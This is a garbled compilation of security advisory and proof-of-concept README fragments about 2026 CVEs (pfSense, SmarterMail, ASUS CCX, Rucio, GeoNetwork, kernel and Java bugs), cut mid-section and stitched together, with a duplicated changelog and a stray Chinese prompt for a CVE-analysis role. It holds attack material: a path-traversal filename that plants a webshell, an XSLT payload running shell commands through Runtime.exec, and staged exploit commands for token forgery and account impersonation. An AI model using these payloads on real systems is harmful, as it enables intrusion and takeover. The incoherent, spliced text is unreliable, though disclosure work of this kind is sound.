（`PSELECT_WAITER_WORD_SHIFT` 需 8，实测 **10**）结构性不成立——[hui191 的 AAK-AN00 研究笔记](https://github.com/hui191/cve-2026-43499-aak-an00)对同一内核串做过完整论证，其对 284006 条 BL / 274792 条调用边的穷举结论直接适用：唯一开放载波是 `rt_sigreturn`。本文选择避开载波问题，走 **TimerRoot 的 timer-UAF 路线**（不依赖栈载波几何，只依赖静态符号表）。

## 4. 完整流程

### 4.1 从出厂固件推导内核 conf（不需要 root）

conf 的全部 30 个字段都来自对 `boot.img` 的静态分析：

```
固件 zip → Software/dload/update_sd_base.zip（内层 zip）
  → image/boot.img（Android v4 头，kernel 在 4096 偏移）
  → vmlinux-to-elf 重建 ELF + kallsyms（基址 0xffffffc080000000）
  → capstone 反汇编定位关键锚点
```

关键锚点的找法（本内核全部验证通过，方法通用于其他 GKI 构建）：

| conf 字段 | 推导方法 |
|---|---|
| `timer_site` | `do_timer_create` 里找 `ldr x0, [xN, #imm]`（xN 由 `adrp` 指向 `posix_timers_cache`）后紧跟的 `bl kmem_cache_alloc`，**返回地址**即 site。本机：`0xffffffc0803aec40` |
| `copy_process_low21` | `copy_process` 里装载 `task_struct_cachep` 后 `bl kmem_cache_alloc_node` 的返回地址低 21 位。本机：`0x1e0e48` |
| `timer_alloc` | `init_posix_timers` 中 `kmem_cache_create` 前的 `mov w1, #0x108` |
| `selinux_state` / `panic_on_warn` / `root_user` / `init_user_ns` / `init_ucounts` / `init_groups` | kallsyms 符号直查 |
| `selinux_blob_off` | 内核镜像里搜 `CONFIG_LSM` 字符串字面量（`landlock,lockdown,yama,loadpin,safesetid,selinux,...`），与参考构建一致 → selinux 是第一个 cred blob 贡献者 → `0x0` |
| `task_cred_off` 等 | `real_cred 0x818 / cred 0x820 / comm 0x830`（无内嵌 BTF，与 hui191 笔记交叉印证） |
| `cred_*` 偏移 | 6.6 家族通用（4 字节 `cred.usage`） |

成品见 [`conf/`](conf/)。`timer --conf <file> selfcheck` 通过（0 failures）。

# Java2Shell / Java4Shell lab

[![CI](https://github.com/zake1god/java2shell/actions/workflows/ci.yml/badge.svg)](https://github.com/zake1god/java2shell/actions/workflows/ci.yml)

Reproducible, local-only checking lab for **CVE-2026-114938**, commonly called
**Java4Shell** and sometimes **Java2Shell**. The vulnerability is an out-of-bounds
write in HotSpot's x86-64 AVX-512 Base64 decoder intrinsic.

> [!CAUTION]
> This repository contains an intentionally vulnerable Java runtime. The
> supplied services bind to `127.0.0.1` only. Never expose them to a public or
> shared network.

## What this repository proves

- exact vulnerable container: Eclipse Temurin `25.0.5+8`, pinned by image digest;
- CPU/runtime checker with a bounded local probe;
- unauthenticated HTTP path into `java.util.Base64.Decoder`;
- measurable writes past the expected output size;
- a negative control using `-XX:-UseBASE64Intrinsics`;
- patch and fleet-checking guidance with source references.

It does **not** contain a reverse shell or pretend that memory corruption alone
is command execution. Calif reports application-specific RCE and has published
a video, but its weaponized product exploits are currently withheld. See
[RCE and shell status](docs/RCE-STATUS.md).

## Exposure gate

All of these conditions must line up:

1. an affected Java runtime;
2. x86-64 CPU with `avx512f`, `avx512bw`, `avx512vbmi`, and `bmi2`;
3. the Base64 intrinsic enabled;
4. attacker-controlled Base64 reaches `java.util.Base64.Decoder` after C2 JIT
   compilation.

ARM64 and x86-64 systems without the required AVX-512 features do not reproduce
this code path. Docker does not emulate missing CPU instructions.

## Quick start

Requirements: Docker Engine with Compose, `curl`, and an affected amd64 host.

```bash
git clone https://github.com/zake1god/java2shell.git
cd java2shell

docker compose up --detach --build
bash scripts/demo.sh
docker compose down
```

Expected result on a supported host:

```text
[vulnerable container]

Independent security research on the **Cudy WR3000 v2.0** router. It is published for defensive
research, vendor accountability, and education. It is **not** affiliated with, sponsored by, or

  calibration data, and decrypted/decompiled vendor Lua or other vendor bytecode.

- Large local evidence artifacts. The full transcripts and dumps stay in a private archive; only
  the sanitized writeups and tools are published.

--- ## Overview pfSense CE's XMLRPC endpoint (`/xmlrpc.php`) exposes privileged PHP execution methods — including `pfsense.exec_php` and `pfsense.exec_shell` — to any authenticated account, regardless of role. The method dispatcher does not enforce the admin role before dispatch. Because the pfSense web UI process runs as root, any low-privilege account holder can invoke these methods to execute arbitrary shell commands as `root` on the firewall host. | Field | Value | |---|---| | **CVE** | CVE-2026-92182 | | **CVSS 3.1** | `8.8 High` — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | | **CWE** | CWE-863 (Incorrect Authorization) | | **Affected** | pfSense CE ≤ 2.8.1 | | **Fixed** | pfSense CE 2.8.2 / pfSense-SA-26_22 | | **ZDI** | [ZDI-26-960](https://www.zerodayinitiative.com/advisories/ZDI-26-960/) | | **Auth Required** | Low — any valid pfSense account (even read-only) | | **Dependencies** | None — Python stdlib only (`urllib`, `xml.etree`) | | **Disclosed** | 2026-11-18 | --- ## Vulnerability Details `/xmlrpc.php` accepts HTTP Basic authentication and dispatches to named methods in the `pfsense.*` namespace. The dispatcher checks only that the caller supplies **the correct password** for the authenticating account, not that the account holds the `admin` role. Any valid local account — including monitoring or read-only accounts — can reach `pfsense.exec_php` and inject arbitrary PHP executed under the web server UID (`root`). The affected admin-only methods: | Method | Effect | |---|---| | `pfsense.exec_php` | Execute arbitrary PHP as root (supports `ob_start()` output capture) | | `pfsense.exec_shell` | Execute a raw shell command string | | `pfsense.backup_config_section` | Read config sections (information disclosure) | | `pfsense.get_installed_packages` | Read installed package list (information disclosure) | --- ## Attack Flow ```mermaid flowchart LR A([Attacker\nLow-privilege account]) -->|POST /xmlrpc.php\nHTTP Basic Auth\npfsense.exec_php| B[pfSense CE ≤ 2.8.1] B -->|Method dispatcher:\npassword check only\nno role check| C[exec_php handler] C -->|system('id; uname -a')| D[root shell\non firewall host] D --> E([Full firewall control\nNAT · VPN · routing · pivot]) style A fill:#3d1a1a,stroke:#f85149,color:#f85149 style D fill:#1a1f2e,stroke:#f85149,color:#f85149 style E fill:#1a1f2e,stroke:#58a6ff,color:#58a6ff ``` --- ## PoC Usage > **Warning:** Authorized testing and isolated lab environments only. # CVE-2026-126967 ### SmarterMail — File Storage API Path Traversal to SYSTEM RCE ![CVSS](https://img.shields.io/badge/CVSS_3.1-8.8_High-important?style=for-the-badge) ![CWE](https://img.shields.io/badge/CWE-22_Path_Traversal-orange?style=for-the-badge) ![Language](https://img.shields.io/badge/Language-Python-blue?style=for-the-badge) ![Fixed](https://img.shields.io/badge/Fixed-Build_9735-brightgreen?style=for-the-badge) ![ZDI](https://img.shields.io/badge/ZDI-ZDI--26--994-purple?style=for-the-badge) ![Disclosed](https://img.shields.io/badge/Disclosed-2026--11--18-informational?style=for-the-badge)
--- ## Overview The SmarterMail `FileStorageController` accepts a caller-supplied file name and constructs the destination path by joining it with the per-account storage root **without normalizing or bounding the result**. An authenticated low-privilege user can embed `..\..\` sequences to write arbitrary files outside the mail-data directory. Because IIS runs as `NT AUTHORITY\SYSTEM`, writing an ASPX webshell to the site root yields unauthenticated command execution at the highest possible Windows privilege level. | Field | Value | |---|---| | **CVE** | CVE-2026-126967 | | **CVSS 3.1** | `8.8 High` — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | | **CWE** | CWE-22 (Path Traversal) | | **Affected** | SmarterMail all builds < 9735 | | **Fixed** | Build 9735 | | **ZDI** | [ZDI-26-994](https://www.zerodayinitiative.com/advisories/ZDI-26-994/) | | **Auth Required** | Low — any valid SmarterMail account | | **Disclosed** | 2026-11-18 | --- ## Vulnerability Details The `FileStorageController.Upload` action accepts a `fileName` parameter. The controller prepends the user's mail-data root but performs no path canonicalization: ``` destination = Path.Combine(userStorageRoot, fileName) // fileName = "..\..\..\..\inetpub\wwwroot\shell.aspx" // destination = "C:\SmarterMail\Domains\..\..\inetpub\wwwroot\shell.aspx" ``` `Path.Combine` on Windows does not resolve `..` sequences — the resulting path resolves to the IIS web root. The API accepts any file extension including `.aspx`, turning the upload into a webshell plant. IIS then serves and executes the ASPX page as SYSTEM. --- ## Attack Flow ```mermaid flowchart LR A([Attacker\nAuthenticated user]) -->|POST /api/v1/filestorage/upload\nfileName: ..\..\..\..\inetpub\wwwroot\shell.aspx| B[SmarterMail\nIIS / SYSTEM] B -->|Writes file to IIS root| C[ASPX Webshell\nc:\inetpub\wwwroot\cve126967.aspx] C -->|GET /cve126967.aspx?c=whoami| D([Unauthenticated\nSYSTEM RCE]) style A fill:#3d1a1a,stroke:#f85149,color:#f85149 style D fill:#1a1f2e,stroke:#58a6ff,color:#58a6ff ``` --- ## PoC Usage > **Warning:** Authorized testing and isolated lab environments only. --- ## Overview Two closely related memory-safety vulnerabilities in the Philips Hue Bridge HomeKit Accessory Protocol (HAP) pairing stack. Both are reachable by any device on the same local network segment during the HAP pairing handshake — no existing pairing or credentials required. | CVE | CWE | Description | CVSS | |---|---|---|---| | CVE-2026-126978 | CWE-122 | HAP SRP verifier TLV8 heap overflow — oversized `publicKey` field overwrites past alloction | 8.8 High | | CVE-2026-126979 | CWE-191 | ChaCha20 session key length integer underflow — negative length passed to decrypt, skips authentication | 8.8 High | | Field | Value | |---|---| | **Affected** | Philips Hue Bridge gen 2 and gen 3 (all firmware prior to patch) | | **Attack Vector** | Adjacent Network (LAN segment) | | **Auth Required** | None — triggered during unauthenticated pairing handshake | | **Disclosed** | 2026-11-18 | --- ## Vulnerability Details ### CVE-2026-126978 — HAP TLV8 Heap Overflow The HAP pairing responder allocates a fixed-size buffer for the SRP `publicKey` TLV field (TLV type `0x03`). The TLV8 parser does not validate that the value length fits within the allocated region before copying. # CVE-2026-114202 ### ASUS CCX — Hardcoded JWT Secret Authentication Bypass ![CVSS](https://img.shields.io/badge/CVSS_3.1-10.0_Critical-critical?style=for-the-badge) ![CWE](https://img.shields.io/badge/CWE-798_Hardcoded_Creds-orange?style=for-the-badge) ![Language](https://img.shields.io/badge/Language-Python-blue?style=for-the-badge) ![Fixed](https://img.shields.io/badge/Fixed-CCX_Firmware_Patch-brightgreen?style=for-the-badge) ![Disclosed](https://img.shields.io/badge/Disclosed-2026--11--18-informational?style=for-the-badge)
--- ## Overview ASUS CCX (Cloud Controller / Communication Exchange) devices ship with a hardcoded HS256 JWT signing secret embedded in firmware. Because the secret never changes between units and cannot be rotated by the administrator, any attacker who reverse-engineers or obtains the secret can forge tokens for any user — including administrator accounts — granting full unauthenticated API access to every CCX device in the wild. | Field | Value | |---|---| | **CVE** | CVE-2026-114202 | | **CVSS 3.1** | `10.0 Critical` — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | | **CWE** | CWE-798 (Use of Hard-coded Credentials) | | **Affected** | ASUS CCX all firmware versions prior to patch | | **Auth Required** | None | | **Disclosed** | 2026-11-18 | --- ## Vulnerability Details CCX exposes a REST API authenticated via HS256-signed JWTs. The signing secret is a static string compiled into the firmware and identical across all units worldwide. The API does not implement: - Secret rotation or per-device key derivation - Token replay protection - IP binding for issued tokens An attacker who extracts the secret from any CCX firmware image (available publicly from ASUS support) can craft tokens for arbitrary user/role combinations and authenticate to **any CCX device** on the internet. The PoC performs a 3-stage attack: 1. **Fingerprint** — confirm target is a CCX device and determine firmware version 2. **Discover** — enumerate valid usernames from the API 3. **Forge** — mint an HS256 JWT for the administrator role and obtain full API access --- ## Attack Flow ```mermaid flowchart LR A([Attacker]) -->|HTTP probe| B[CCX Device\nany unit worldwide] B -->|CCX version banner| A A -->|Extract hardcoded\nHS256 secret from firmware| C[Known Secret\nHS256] C -->|Forge admin JWT| D[POST /api/auth/token\nForged token] D --> B B -->|200 OK\nFull admin session| E([Admin Access\nAll CCX APIs]) style A fill:#3d1a1a,stroke:#f85149,color:#f85149 style C fill:#2d1a3d,stroke:#a855f7,color:#a855f7 style E fill:#1a1f2e,stroke:#58a6ff,color:#58a6ff ``` --- ## PoC Usage > **Warning:** Authorized testing and isolated lab environments only. ### Setup ```bash pip install -r requirements.txt # requirements: requests, pyjwt ``` ### Stage 1 — Fingerprint Confirm the target is a CCX device and retrieve version information: ```bash python3 poc.py --target https://ccx.example.com --stage fingerprint ``` Expected output: ``` [*] target: https://ccx.example.com [+] ASUS CCX detected model: CCX-2000 version: 3.1.4-build20260118 [*] firmware version vulnerable: YES ``` ### Stage 2 — Discover Enumerate accessible API endpoints and valid usernames: ```bash python3 poc.py --target https://ccx.example.com --stage discover ``` Expected output: ``` [*] enumerating users via /api/users (unauthenticated list) [+] found users: admin, operator, monitor [*] enumerating endpoints... [+] accessible endpoints: /api/config, /api/logs, /api/system, /api/users ``` ### Stage 3 — Forge (full exploit) Mint a forged administrator JWT and authenticate: ```bash python3 poc.py --target https://ccx.example.com --stage forge --user admin # Chain all 3 stages in one run python3 poc.py --target https://ccx.example.com --stage all --user admin ``` Expected output: ``` [*] forging HS256 JWT for user=admin role=administrator [+] token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4... [*] authenticating with forged token... POST /api/auth/token HTTP 200 [!] VULNERABLE — authenticated as administrator without credentials [*] GET /api/system HTTP 200 {"hostname":"ccx-prod-01","uptime":...} ``` ### Available flags | Flag | Description | |---|---| | `--target URL` | Target CCX base URL (required) | | `--stage fingerprint\|discover\|forge\|all` | Attack stage to run | | `--user NAME` | Username to forge token for (default: `admin`) | | `--role ROLE` | Role to embed in token (default: `administrator`) | | `--proxy URL` | HTTP proxy for Burp Suite integration | | `--no-verify` | Skip TLS certificate verification | ### Expected output — patched device ``` [*] target: https://ccx.example.com [*] forging HS256 JWT for user=admin [*] POST /api/auth/token HTTP 401 Unauthorized [+] NOT vulnerable — secret has been rotated or token rejected ``` --- ## Detection | Indicator | Notes | |---|---| | Auth token iss ``` **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。 **任务：** 1. **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。 2. **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。 3. **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。 4. **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。 5. **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。 6. **排序优先级:** 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 7. **输出内容:** 务必使用中文 8. **markdown内容:** 务必使用markdown格式，包含以下部分： - # CVE-2026-100397 ### Rucio — SSH Challenge Token Auth Bypass ![CVSS](https://img.shields.io/badge/CVSS_3.1-10.0_Critical-critical?style=for-the-badge) ![CWE](https://img.shields.io/badge/CWE-287_Auth_Bypass-orange?style=for-the-badge) ![Language](https://img.shields.io/badge/Language-Python-blue?style=for-the-badge) ![Fixed](https://img.shields.io/badge/Fixed-Rucio_36.4.1-brightgreen?style=for-the-badge) ![Disclosed](https://img.shields.io/badge/Disclosed-2026--11--18-informational?style=for-the-badge)
--- ## Overview Rucio's REST API exposes `/auth/ssh_challenge_token` for SSH-key-based authentication. The endpoint issues a signed challenge token and accepts it back for verification, but does **not** validate that the token was signed with a key registered to the requesting account. By supplying any valid `X-Rucio-Account` header with a token obtained for a different identity, an attacker can authenticate as any Rucio account — including service accounts and administrators — **without possessing the corresponding private key**. | Field | Value | |---|---| | **CVE** | CVE-2026-100397 | | **CVSS 3.1** | `10.0 Critical` — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | | **CWE** | CWE-287 (Improper Authentication) | | **Affected** | Rucio server < 36.4.1 | | **Fixed** | Rucio 36.4.1 | | **Auth Required** | None | | **Disclosed** | 2026-11-18 | --- ## Vulnerability Details The SSH authentication flow: 1. Client calls `GET /auth/ssh_challenge_token` → receives a short-lived challenge token. 2. Client signs the token with its private SSH key. 3. Client calls `GET /auth/ssh` with the signed token → server verifies the signature against the account's registered public keys. The bypass: step 3 does not enforce that the account named in `X-Rucio-Account` owns a key that produced the signature. A valid signature from **any** key accepted by the server satisfies the check. Combined with an attacker-controlled `X-Rucio-Account` header, the attacker impersonates an arbitrary account. --- ## Attack Flow ```mermaid flowchart LR A([Attacker]) -->|GET /auth/ssh_challenge_token\nX-Rucio-Account: attacker_own| B[Rucio Server] B -->|challenge token| A A -->|Sign with own key| C[Signed Token] C -->|GET /auth/ssh\nX-Rucio-Account: admin\nSigned token from attacker key| B B -->|Verifies signature — PASSES\nIgnores account mismatch| D[Auth Token\nfor 'admin'] D --> E([Full admin access\nto all data, transfers, accounts]) style A fill:#3d1a1a,stroke:#f85149,color:#f85149 style E fill:#1a1f2e,stroke:#58a6ff,color:#58a6ff ``` --- ## PoC Usage > **Warning:** Authorized testing and isolated lab environments only. ### Setup ```bash pip install requests ``` ### Run the PoC ```bash # Step 1: Obtain a challenge token for your own (attacker-controlled) account python3 poc.py --server https://rucio.example.com --account attacker_account \ --mode challenge # Step 2: Full exploit — impersonate target account using own SSH key python3 poc.py --server https://rucio.example.com --account attacker_account \ --key ~/.ssh/id_rsa --impersonate root \ --mode exploit # Step 3: Verify token works — list files as impersonated account python3 poc.py --server https://rucio.example.com --account attacker_account \ --key ~/.ssh/id_rsa --impersonate root \ --mode verify ``` ### Available flags | Flag | Description | |---|---| | `--server URL` | Rucio server base URL (required) | | `--account NAME` | Your own Rucio account (attacker-controlled) | | `--key PATH` | Path to your SSH private key | | `--impersonate NAME` | Account to impersonate (e.g. `root`, `admin`) | | `--mode challenge\|exploit\|verify` | Operation mode | | `--port N` | Alternative API port (default: 443) | ### Expected output — vulnerable server ``` [*] server: https://rucio.example.com account: attacker_account [*] obtaining challenge token for 'attacker_account'... [+] challenge: v1_abc123...def456 (expires in 300s) [*] signing challenge with ~/.ssh/id_rsa [*] attempting auth as 'root' with attacker-signed token... [+] AUTH TOKEN: a2d9f1...8b3c (issued for account: root) [!] VULNERABLE — authenticated as 'root' without root's private key [*] verifying token: GET /accounts/root/scopes [+] CONFIRMED — scope list returned for account root ``` ### Expected output — patched server ``` [*] server: https://rucio.example.com [*] signing challenge for 'attacker_account', impersonating 'root'... # Changelog

## [1.1.0] - 2026-11-18

- Per-distribution fix table: `vendor_fixed_version OSID RELEASE PKGNAME` returns
  the minimum fixed package version for a distribution release, and `judge()`
  compares the installed package with it (after the changelog check, before the
  `UNKNOWN` fallback) using the package manager's own comparator: `dpkg
  --compare-versions`, `rpm --eval` with `rpm.vercmp`, `apk version -t`.
  Installed at or above the row is `patched`, below it `unpatched`. A missing
  row, an empty or placeholder threshold, or a missing or failing comparator
  keeps the state `UNKNOWN`. `OSID` and the release come from `/etc/os-release`
  read as text.
- The table holds only verified rows. Data collected 2026-11-18 (`MATRIX_DATE`):
  Alpine 3.24 nginx 1.30.7-r0 (secdb and the Alpine security tracker list both
  CVEs). No row for Debian (tracker: "(unfixed)"), Ubuntu (all releases
  "needed"), RHEL (no record) because they had no fixed build yet; those
  distributions are still `UNKNOWN` below the upstream fix unless the changelog
  names both CVE ids.
- Test hook `NGINX_AUDIT_TEST_FIXTABLE=<file>` (rows `osid release package
  fixedversion`), honoured only when not running as root, like the other test
  hooks. Tests grew from 197 to 262, with plain-awk fake comparators for dpkg,
  rpm and apk.
- The table logic was mutation-checked (14 mutants of the comparators, the threshold
  validation and the `judge()` branch): the version that reaches `rpm --eval` is validated
  and a test proves the call never carries an unvalidated version; the table never clears
  a replaced running binary, only the package on disk.

## [1.0.1] - 2026-11-18

Found by running the 1.0.0 audit on a UniFi gateway, where it reported MITIGATED
for an nginx that has HTTP/2 enabled on its public listeners.

- Fix: config files pulled in by `include` could be dropped. The include walk is
  recursive and shell variables are global, so the depth counter of a child leaked
  into its siblings: after the sixth included file every further file was skipped
  (the `site-*.conf` files with the servers were never read, so the result was
  "server blocks: 0" and MITIGATED). Each child now runs in a subshell. The
  directory used for relative includes was overwritten the same way.
- Fix: a binary in a directory that is `root:root` and group-writable (UniFi OS has
  `/usr/sbin` at 775) was refused as untrusted, so `nginx -V` and `nginx -T` were
  not used. Only group `root` is exempt; any other writable group still blocks the run.
- Regression tests for 13 sibling includes, a relative include after an absolute
  one, and an include after eight files of an earlier include; an end-to-end check
  of the `root:root` 775 and other-group cases on Alpine.
- Tests: a mutation run over the verdict logic (129 mutants, 54 survived) showed
  that the "binary must not be executed" tests could never fail, because their
  fake binaries made a marker with `touch`, which does not exist in the restricted
  tool path. Markers now use a shell builtin and a positive control proves the
  mechanism. Further tests cover write-only mode bits, a directory writable by
  others, a host and a container runtime with the same exe path (separate
  instances, each with its own configuration), the changelog rule at 1.19.6 and
  1.19.7, a replaced running binary, `#` inside a token, quoting, localhost
  listeners, and unreadable processes. 197 tests (was 146).

# Changelog

## [1.1.0] - 2026-11-18

- Per-distribution fix table: `vendor_fixed_version OSID RELEASE PKGNAME` returns
  the minimum fixed package version for a distribution release, and `judge()`
  compares the installed package with it (after the changelog check, before the
  `UNKNOWN` fallback) using the package manager's own comparator: `dpkg
  --compare-versions`, `rpm --eval` with `rpm.vercmp`, `apk version -t`.
  Installed at or above the row is `patched`, below it `unpatched`. A missing
  row, an empty or placeholder threshold, or a missing or failing comparator
  keeps the state `UNKNOWN`. `OSID` and the release come from `/etc/os-release`
  read as text.
- The table holds only verified rows. Data collected 2026-11-18 (`MATRIX_DATE`):
  Alpine 3.24 nginx 1.30.7-r0 (secdb and the Alpine security tracker list both
  CVEs). No row for Debian (tracker: "(unfixed)"), Ubuntu (all releases
  "needed"), RHEL (no record) because they had no fixed build yet; those
  distributions are still `UNKNOWN` below the upstream fix unless the changelog
  names both CVE ids.
- Test hook `NGINX_AUDIT_TEST_FIXTABLE=<file>` (rows `osid release package
  fixedversion`), honoured only when not running as root, like the other test
  hooks. Tests grew from 197 to 262, with plain-awk fake comparators for dpkg,
  rpm and apk.
- The table logic was mutation-checked (14 mutants of the comparators, the threshold
  validation and the `judge()` branch): the version that reaches `rpm --eval` is validated
  and a test proves the call never carries an unvalidated version; the table never clears
  a replaced running binary, only the package on disk.

## [1.0.1] - 2026-11-18

Found by running the 1.0.0 audit on a UniFi gateway, where it reported MITIGATED
for an nginx that has HTTP/2 enabled on its public listeners.

- Fix: config files pulled in by `include` could be dropped. The include walk is
  recursive and shell variables are global, so the depth counter of a child leaked
  into its siblings: after the sixth included file every further file was skipped
  (the `site-*.conf` files with the servers were never read, so the result was
  "server blocks: 0" and MITIGATED). Each child now runs in a subshell. The
  directory used for relative includes was overwritten the same way.
- Fix: a binary in a directory that is `root:root` and group-writable (UniFi OS has
  `/usr/sbin` at 775) was refused as untrusted, so `nginx -V` and `nginx -T` were
  not used. Only group `root` is exempt; any other writable group still blocks the run.
- Regression tests for 13 sibling includes, a relative include after an absolute
  one, and an include after eight files of an earlier include; an end-to-end check
  of the `root:root` 775 and other-group cases on Alpine.
- Tests: a mutation run over the verdict logic (129 mutants, 54 survived) showed
  that the "binary must not be executed" tests could never fail, because their
  fake binaries made a marker with `touch`, which does not exist in the restricted
  tool path. Markers now use a shell builtin and a positive control proves the
  mechanism. Further tests cover write-only mode bits, a directory writable by
  others, a host and a container runtime with the same exe path (separate
  instances, each with its own configuration), the changelog rule at 1.19.6 and
  1.19.7, a replaced running binary, `#` inside a token, quoting, localhost
  listeners, and unreadable processes. 197 tests (was 146).

# GeoNetwork PreAuth RCE - CVE-2026-63219 + CVE-2026-58400

A proof-of-concept exploit for an unauthenticated remote code execution chain in GeoNetwork versions up to and including 4.4.11.0.

---

## Overview

GeoNetwork is an open-source geospatial metadata catalog built on Java/Spring. This exploit chains two vulnerabilities to achieve unauthenticated RCE:

| CVE | Type | CVSS | Component |
|-----|------|------|-----------|
| CVE-2026-63219 | Missing authorization on formatter upload | 8.6 | `FormatterAdminApi` |
| CVE-2026-58400 | Saxon XSLT Java extension execution | 9.1 | Saxon-HE processor |

**Affected versions:** GeoNetwork <= 4.4.11.0  
**Authentication required:** None  
**Network access required:** Yes (HTTP)

---

## Vulnerability Details

### CVE-2026-63219 - Unauthenticated Formatter Upload

`FormatterAdminApi.uploadFormatter()` is missing the `@PreAuthorize` annotation that the rest of the admin API endpoints use. This means any unauthenticated user can POST a `.xsl` file to `/geonetwork/srv/api/formatters`.

Uploaded files are stored at:
```
/var/lib/geonetwork/data/formatter/<name>/view.xsl
```

The formatter name (and therefore the trigger path) is derived directly from the uploaded filename.

One non-obvious requirement: the request **must** include `Accept: application/json`. Without it, GeoNetwork's dispatcher returns a 500 "Service not found" before the upload handler is reached.

### CVE-2026-58400 - Saxon XSLT Java Extension RCE

GeoNetwork initializes the Saxon-HE XSLT processor with `ALLOW_EXTERNAL_FUNCTIONS=true`. Saxon's Java extension mechanism allows binding arbitrary Java class namespaces inside an XSL stylesheet:

```xml
xmlns:rt="java:java.lang.Runtime"
```

With this, `java.lang.Runtime.exec()` becomes callable directly from XSL, enabling OS command execution when a formatter is triggered.

Formatters are triggered via:
```
GET /geonetwork/srv/api/records/{UUID}/formatters/{formatterName}
```

A valid metadata record UUID is required in the URL - GeoNetwork validates it before invoking Saxon. Any existing record UUID in the catalog works; the XSL ignores the record content entirely.

### Reading Command Output

`Runtime.exec()` returns a `Process` object. Output is read through the process's `InputStream`. The reliable approach in Saxon is to wrap it with `InputStreamReader` -> `BufferedReader` and call `readLine()`:

```xml
<xsl:variable name="rt"   select="rt:getRuntime()"/>
<xsl:variable name="proc" select="rt:exec($rt, ('bash', '-c', 'id'))"/>
<xsl:variable name="is"   select="proc:getInputStream($proc)"
                          xmlns:proc="java:java.lang.Process"/>
<xsl:variable name="isr"  select="isr:new($is)"/>
<xsl:variable name="br"   select="br:new($isr)"/>
<result><xsl:value-of select="br:readLine($br)"/></result>
```

Each method call must be assigned to its own `xsl:variable`. Chained calls (e.g. `sc:next(sc:useDelimiter($s,'\A'))`) fail silently in Saxon because the intermediate return value is not correctly retained between calls.

### CSRF Bypass

Spring's CSRF protection requires a valid token for state-changing requests. GeoNetwork uses the double-submit cookie pattern:

1. Send a GET to `/api/me` — the response sets an `XSRF-TOKEN` cookie
2. Echo that value in the `X-XSRF-TOKEN` request header on the POST

No login is needed; the token is handed out to unauthenticated requests.

# Corrections in v1.0.1

`v1.0.1` is a corrective release of the research package. The original
`v1.0.0` tag remains an immutable historical snapshot.

## Version ranges

The original README applied `0.1.16–0.1.38` to all seven records. Full release
history shows that the relevant paths entered the package at different times:

| ID | Corrected relevant versions |
|---|---|
| F-01 | `0.1.32–0.1.38` |
| F-02 | `0.1.32–0.1.38` |
| F-04 | `0.0.14–0.1.38` |
| F-08 | `0.1.16–0.1.38` |
| F-09 | `0.0.11–0.1.38` |
| F-10 | `0.1.32–0.1.38` |
| F-11 | `0.0.18–0.1.38` |

For F-04 and F-11, these are the releases containing the relevant construction,
not a claim that every listed release is exploitable.

## Severity scores

The original package included researcher-proposed CVSS v3.1 scores. Three
displayed numbers did not match their vectors:

- F-04: published `5.9`; the vector calculates to `6.3`;
- F-08: published `5.4`; the vector calculates to `5.0`;
- F-10: published `7.5`; the vector calculates to `6.5`.

The corrective release removes all provisional numeric scores because the
demonstrated evidence does not independently establish every impact metric.
Future CNA records may assign or merge severity differently.

## Reclassified records

### F-04

The original practical collision claim confused a chosen-prefix collision with
a second-preimage problem against an already fixed trusted identifier. F-04 now
records MD5 namespace hardening; no practical token namespace takeover is
claimed.

### F-11

The pinned SDK checks SSE endpoint origin, and the pinned HTTP implementation
removes credentials on cross-origin redirects. F-11 now records an explicit
wrapper-level origin check as defense-in-depth; no current token-forwarding
exploit is claimed.

## Presentation

- Replaced the long horizontal “headline chain” with a compact vertical
  trust-boundary map.
- Replaced the original abstract eight-marker hero with a structured three-zone
  cover. The cover is visual orientation; the trust-boundary map and advisory index
  remain the authoritative technical explanation.
- Replaced “upgrade guidance” with “mitigation guidance” because no later
  upstream release was known at disclosure time.
